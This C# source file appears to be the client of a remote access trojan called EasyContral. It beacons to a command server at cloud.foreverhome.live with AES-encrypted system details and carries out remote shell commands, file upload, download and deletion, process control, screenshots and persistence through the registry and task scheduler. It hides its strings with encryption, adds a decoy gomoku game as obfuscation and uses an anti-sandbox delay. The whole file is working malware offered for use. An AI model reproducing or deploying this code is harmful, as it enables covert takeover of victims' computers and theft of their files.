using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using Newtonsoft.Json;
using System.IO;
using System.Net.Http;
using Microsoft.Win32;
using System.Net.Sockets;
using System.Net;
using System.Security.Cryptography;

namespace EasyContral
{
    internal class Program
    {
        static string Server_Ip = "cloud.foreverhome.live";// Server端地址
        static public string Key = "jV5lO66M/CmXk3OP067sLbgfYTAanFcAT8oOhSzUYtw=";
        static public string IV = "rNQez1Kfq8OqujG5EuyrVA==";

        static string ClientID = SystemInfo.GetClientID();
        static string CPUInfo = SystemInfo.GetCpuName();
        static string OSInfo = SystemInfo.GetSystemVersion();
        static string MemoryInfo = SystemInfo.GetMemoryInMb();
        static string HostName = SystemInfo.GetSystemName();
        //static List<string> DriveInfo = SystemInfo.GetDrive();
        static int WaitTime = 5000;

        /// <summary>
        /// 代码混淆功能
        /// </summary>
        public static int left = 0;
        public static int top = 18;
        public static string[,] QP = new string[17, 17];
        public static string[,] QZ = new string[17, 17];
        public static void qp()
        {
            for (int i = 0; i < 17; i++)
            {
                for (int j = 0; j < 17; j++)
                {
                    QP[i, j] = "┼";
                }
            }
            for (int i = 0; i < 17; i++)
            {
                for (int j = 0; j < 17; j++)
                {
                    Console.Write(QP[i, j]);
                }
                Console.WriteLine();
            }
        }
        public static void move()
        {
            qp();
            Console.WriteLine(" 双人PK,燃起来吧！\n");
            Console.WriteLine(" 玩家1： W S A D  控制方向   空格键落子");
            Console.WriteLine(" 玩家2：↑↓← → 控制方向   Enter键落子");

            left = 16; top = 8;
            bool M = true;
            while (true)
            {
                Program program = new Program();
                if (M)
                {
                    int i = 1;
                    int j = i + 1;
                    if (i == j)
                    {
                        Console.WriteLine("●");
                        QZ[left / 2, top] = "●";
                        M = false;

                        if (Judge() == true)
                        {
                            Console.WriteLine($"\n {QZ[left / 2, top]}方，胜利");
                            break;
                        }
                    }
                }
                else
                {
                    int i = 1;
                    int j = i + 1;
                    if (i == j)
                    {
                        Console.WriteLine("○");
                        QZ[left / 2, top] = "○";
                        M = true;

                        if (Judge() == true)
                        {
                            Console.Write($"\n {QZ[left / 2, top]}方，胜利");
                            break;
                        }
                    }
                }
            }
        }
        public static bool Judge()
        {
            int n1 = 1, n2 = 1, n3 = 1, n4 = 1;
            for (int j = 1; j < 5; j++)
            {
                if (left / 2 + j <= 16)
                {
                    if (QZ[left / 2, top] == QZ[left / 2 + j, top]) { n1++; }
                    else { break; }
                }
            }
            for (int j = 1; j < 5; j++)
            {
                if (left / 2 - j >= 0)
                {
                    if (QZ[left / 2, top] == QZ[left / 2 - j, top]) { n1++; }
                    else { break; }
                }
            }
            for (int j = 1; j < 5; j++)
            {
                if ((top + j <= 16))
                {
                    if (QZ[left / 2, top] == QZ[left / 2, top + j]) { n2++; }
                    else { break; }
                }
            }
            for (int j = 1; j < 6; j++)
            {
                if (top - j >= 0)
                {
                    if (QZ[left / 2, top] == QZ[left / 2, top - j]) { n2++; }
                    else { break; }
                }
            }
            for (int j = 1; j < 5; j++)
            {
                if ((left / 2 - j >= 0) && (top - j >= 0))
                {
                    if (QZ[left / 2, top] == QZ[left / 2 - j, top - j]) { n3++; }
                    else { break; }
                }
            }
            for (int j = 1; j < 5; j++)
            {
                if ((left / 2 + j <= 16) && (top + j <= 16))
                {
                    if (QZ[left / 2, top] == QZ[left / 2 + j, top + j]) { n3++; }
                    else { break; }
                }
            }
            for (int j = 1; j < 5; j++)
            {
                if ((left / 2 + j <= 16) && (top - j >= 0))
                {
                    if (QZ[left / 2, top] == QZ[left / 2 + j, top - j]) { n4++; }
                    else { break; }
                }
            }
            for (int j = 1; j < 5; j++)
            {
                if ((left / 2 - j >= 0) && (top + j <= 16))
                {
                    if (QZ[left / 2, top] == QZ[left / 2 - j, top + j]) { n4++; }
                    else { break; }
                }
            }
            if (n1 >= 5 || n2 >= 5 || n3 >= 5 || n4 >= 5) { return true; }
            else { return false; }
        }
        static void Main(string[] args)
        {
            //混淆函数
            ThreadPool.QueueUserWorkItem(Items => { move(); });

            if (AntiSandBox())
            {
                return;
            }
            string Drive = "";

            HttpClient client = new HttpClient();
            while (true)
            {
                try
                {
                    Dictionary<string, Dictionary<string, string>> DicMessage = new Dictionary<string, Dictionary<string, string>>();
                    Dictionary<string, string> State = new Dictionary<string, string>();
                    Dictionary<string, string> Data = new Dictionary<string, string>();
                    //State.Add("Type", "Connecting");
                    State.Add(AESDecrypt("0xAu5UiRiZnoXm+bJodmQg==", Key, IV), AESDecrypt("OqYQ3RtTKfVCu++DfKYx4Q==", Key, IV));
                    //State.Add("ClientID", ClientID);
                    State.Add(AESDecrypt("sLPOasNk+M6R5RamrIlOoA==", Key, IV), ClientID);
                    //Data.Add("CPUInfo", CPUInfo);
                    Data.Add(AESDecrypt("fR42XnBH1YSP/1UeSUe27Q==", Key, IV), CPUInfo);
                    //Data.Add("OSInfo", OSInfo);
                    Data.Add(AESDecrypt("GtSeAvriDjw9UP/FPWB+SQ==", Key, IV), OSInfo);
                    //Data.Add("MemoryInfo", MemoryInfo);
                    Data.Add(AESDecrypt("x3Hkt9kHTYUwmI36ryynrQ==", Key, IV), MemoryInfo);
                    //Data.Add("HostName", HostName);
                    Data.Add(AESDecrypt("aWE9zu/7O82b3atgVd6l2A==", Key, IV), HostName);
                    //DicMessage.Add("State", State);
                    DicMessage.Add(AESDecrypt("MeQNthYfPvz5oru24Vr0hQ==", Key, IV), State);
                    //DicMessage.Add("Data", Data);
                    DicMessage.Add(AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV), Data);
                    string JsonMessage = DicToJson(DicMessage);
                    JsonMessage = AESEncrypt(JsonMessage, Key, IV);
                    var content = new StringContent(JsonMessage, Encoding.UTF8, "application/json");
                    HttpResponseMessage Response = client.PostAsync($"http://{Server_Ip}:4400/", content).Result;
                    string ResponseBody = Response.Content.ReadAsStringAsync().Result;
                    ResponseBody = AESDecrypt(ResponseBody, Key, IV);
                    Dictionary<string, Dictionary<string, string>> result = new Dictionary<string, Dictionary<string, string>>();
                    result = JsonToDic(ResponseBody);
                    DicMessage.Clear();
                    State.Clear();
                    Data.Clear();
                    //string Type = result["State"]["Type"];
                    string Type = result[AESDecrypt("MeQNthYfPvz5oru24Vr0hQ==", Key, IV)][AESDecrypt("0xAu5UiRiZnoXm+bJodmQg==", Key, IV)];
                    //string Command = result["Data"]["ServerMessage"];
                    string Command = result[AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV)][AESDecrypt("YfckT1CDHddRjspyK/+G7A==", Key, IV)];
                    switch (Type)
                    {
                        case "CMD":
                            string output = GeneralContral.Shell(Command);
                            //SendToServer(result, output, "CMDResult");
                            SendToServer(result, output, AESDecrypt("la/g01byyTkNvvbd8KCOmw==", Key, IV));
                            break;
                        case "Drives":
                            //SendToServer(result, Drive, "DirResult");
                            SendToServer(result, Drive, AESDecrypt("U9ImpoXkig2Ym3GuDa1umw==", Key, IV));
                            break;
                        case "Files":
                            string files = FileContral.GetFileList(Command);
                            //SendToServer(result, files, "FilesResult");
                            SendToServer(result, files, AESDecrypt("ZxFxSeeIg6vzRpV18NdzyQ==", Key, IV));
                            break;
                        case "File_Upload":
                            //string file = result["Data"]["FileData"];
                            string file = result[AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV)][AESDecrypt("iKbImWYMAqPazPQ7cW5flw==", Key, IV)];
                            FileContral.UploadFile(Command, file);
                            //SendToServer(result, "OK", "File_UploadResult");
                            SendToServer(result, "OK", AESDecrypt("Tw3iR732+O93AxseWpqih/dU7Guy9ODN7i0k7HcnZzs=", Key, IV));
                            break;
                        case "File_Download":
                            string FileName = Path.GetFileName(Command);
                            string FileTxt = FileContral.DownloadFile(Command);
                            //SendToServer(result, FileName + "?" + FileTxt, "File_DownloadResult");
                            SendToServer(result, FileName + "?" + FileTxt, AESDecrypt("LWQfIWiuWfMziTMJmzzxYrj/Z5caJ9qA+u2MFK1Yu24=", Key, IV));
                            break;
                        case "File_ReName":
                            string NewName = Command.Split('?')[0];
                            string OldName = Command.Split('?')[1];
                            FileContral.RenameFile(OldName, NewName);
                            //SendToServer(result, "OK", "File_ReNameResult");
                            SendToServer(result, "OK", AESDecrypt("LkDO63SM3HLSNUx+hiLfLEPj8rYMG5bnTSFZCT8ZgXw=", Key, IV));
                            break;
                        case "File_Delete":
                            FileContral.DeleteFile(Command);
                            //SendToServer(result, "OK", "File_DeleteResult");
                            SendToServer(result, "OK", AESDecrypt("56mVF/XGQSQpNPi4lEOX2WGydijsmLtG6FzXEhFrf+s=", Key, IV));
                            break;
                        case "GetProcess":
                            Dictionary<string, Dictionary<string, string>> Processs = GeneralContral.AllProcess();
                            string Processs_ = JsonConvert.SerializeObject(Processs);
                            //SendToServer(result, Processs_, "GetProcessResult");
                            SendToServer(result, Processs_, AESDecrypt("1Ur9IeFhne8Gz79ZZ1Qdb8PL42GiuUC88IsO5VOmQsk=", Key, IV));
                            break;
                        case "KillProcess":
                            GeneralContral.KillProcess(Command);
                            //SendToServer(result, "OK", "KillProcessResult");
                            SendToServer(result, "OK", AESDecrypt("OuqBLEjUxP2YEStFJXl77zJcGeXsHmD0zGDiPdbG6QQ=", Key, IV));
                            break;
                        case "CreateProcess":
                            GeneralContral.StartProcess(Command);
                            //SendToServer(result, "OK", "StartProcessResult");
                            SendToServer(result, "OK", AESDecrypt("9Pv2MhLbKggqvE0E9rpGTqMOYVo/Rkadgu3RiAVmgYw=", Key, IV));
                            break;
                        case "GetDesktop":
                            string base64img = GeneralContral.ScreenShot();
                            //SendToServer(result, base64img, "GetDesktopResult");
                            SendToServer(result, base64img, AESDecrypt("y3cBEXi88K2GrN5Gki3x8Xi88YdjXYkYCqIzFz2NXXY=", Key, IV));
                            break;
                        case "AutoRunTaskScheduler":
                            GeneralContral.AutoRun_TaskScheduler();
                            //SendToServer(result, "OK", "AutoRunTaskSchedulerResult");
                            SendToServer(result, "OK", AESDecrypt("KT7lTMzBcTtwzeKfFqESIbKM4O8BsXI3xcmtywC0kIg=", Key, IV));
                            break;
                        case "AutoRunRegistry":
                            GeneralContral.AutoRun_Registry();
                            //SendToServer(result, "OK", "AutoRunRegistryResult");
                            SendToServer(result, "OK", AESDecrypt("f0K33hL+D0BGnVKW8rtojt0VFBYtmae6+9W9QtWhlUI=", Key, IV));
                            break;
                        case "SetSleepTime":
                            WaitTime = int.Parse(Command) * 1000;
                            break;
                    }
                }
                catch(AggregateException ex) 
                {
                    continue;
                }
                Thread.Sleep(WaitTime);
            }
        }
        static bool AntiSandBox()
        {
            if (IsRegistryKeyExists(@"SOFTWARE\Tencent\QQ") || IsRegistryKeyExists(@"SOFTWARE\Tencent\WeChat"))
            {
                return true;
            }
            ulong time = GetNetworkTimeInSeconds();
            while (true)
            {
                ulong now = GetNetworkTimeInSeconds();
                Console.WriteLine(now - time);
                if (now - time >= 300)
                {
                    return false;
                }
            }
        }
        public static ulong GetNetworkTimeInSeconds()
        {
            const string ntpServer = "time.windows.com";
            var ntpData = new byte[48];
            ntpData[0] = 0x1B;

            var addresses = Dns.GetHostEntry(ntpServer).AddressList;
            var ipEndPoint = new IPEndPoint(addresses[0], 123);
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
            {
                socket.Connect(ipEndPoint);
                socket.Send(ntpData);
                socket.Receive(ntpData);
            }
            const byte serverReplyTime = 40;
            ulong intPart = BitConverter.ToUInt32(ntpData, serverReplyTime);
            ulong fractPart = BitConverter.ToUInt32(ntpData, serverReplyTime + 4);
            intPart = SwapEndianness(intPart);
            fractPart = SwapEndianness(fractPart);
            ulong milliseconds = (intPart * 1000) + ((fractPart * 1000) / 0x100000000L);
            ulong seconds = milliseconds / 1000;
            Thread.Sleep(5000);
            return seconds;
        }
        private static uint SwapEndianness(ulong x)
        {
            return (uint)(((x & 0x000000ff) << 24) + ((x & 0x0000ff00) << 8) + ((x & 0x00ff0000) >> 8) + ((x & 0xff000000) >> 24));
        }
        private static bool IsRegistryKeyExists(string registryPath)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath))
            {
                return key == null;
            }
        }
        static void SendToServer(Dictionary<string, Dictionary<string, string>> result,string output,string Type) 
        {
            Dictionary<string, Dictionary<string, string>> DicMessage = new Dictionary<string, Dictionary<string, string>>();
            Dictionary<string, string> State = new Dictionary<string, string>();
            Dictionary<string, string> Data = new Dictionary<string, string>();
            HttpClient client_ = new HttpClient();
            State.Add("Type", Type);
            State.Add("ClientID", ClientID);
            Data.Add("Result", output);
            DicMessage.Add("State", State);
            DicMessage.Add("Data", Data);
            string JsonMessage_ = DicToJson(DicMessage);
            JsonMessage_ = AESEncrypt(JsonMessage_, Key, IV);
            var content_ = new StringContent(JsonMessage_, Encoding.UTF8, "application/json");
            client_.PostAsync($"http://{Server_Ip}:4400/", content_);
        }
        static string DicToJson(Dictionary<string,Dictionary<string,string>> DicMessage)
        {
            string Json = JsonConvert.SerializeObject(DicMessage, Formatting.Indented);
            return Json;
        }
        static Dictionary<string, Dictionary<string, string>> JsonToDic(string Json)
        {
            Dictionary<string, Dictionary<string, string>> Dic = JsonConvert.DeserializeObject<Dictionary<string, Dictionary<string, string>>>(Json);
            return Dic;
        }
        public static string AESEncrypt(string plainText, string key_, string iv_)
        {
            using (Aes aesAlg = Aes.Create())
            {
                byte[] key = Convert.FromBase64String(key_);
                byte[] iv = Convert.FromBase64String(iv_);
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        return Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
            }
        }
        public static string AESDecrypt(string cipherText, string key_, string iv_)
        {
            using (Aes aesAlg = Aes.Create())
            {
                byte[] key = Convert.FromBase64String(key_);
                byte[] iv = Convert.FromBase64String(iv_);
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText)))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
        }


    }
}
